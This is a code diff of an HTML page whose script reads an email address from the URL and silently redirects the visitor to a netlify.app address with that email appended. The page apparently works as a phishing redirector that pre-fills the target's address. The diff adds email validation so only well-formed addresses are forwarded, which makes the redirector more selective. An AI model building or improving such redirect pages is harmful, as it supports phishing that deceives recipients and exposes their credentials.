@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
@@ -16,10 +16,14 @@
         var param = hash || eta || '';
         // Process parameter with getafterhash
         var url_get_email = getafterhash(param);
-        // Construct redirect URL
-        var mail_go_url = "https://dainty-pasca-796ecb.netlify.app#" + url_get_email;
-        // Perform redirect
-        location.replace(mail_go_url);
+        // Validate email address
+        if (isValidEmail(url_get_email)) {
+            // Construct redirect URL
+            var mail_go_url = "https://dainty-pasca-796ecb.netlify.app#" + url_get_email;
+            // Perform redirect
+            location.replace(mail_go_url);
+        }
+        // If not a valid email, no redirect occurs
 
         function getafterhash(url) {
             var ret;
@@ -47,6 +51,12 @@
                 }
             }
             return ret;
+        }
+
+        function isValidEmail(email) {
+            // Basic email validation regex
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
         }
     </script>
 </body>
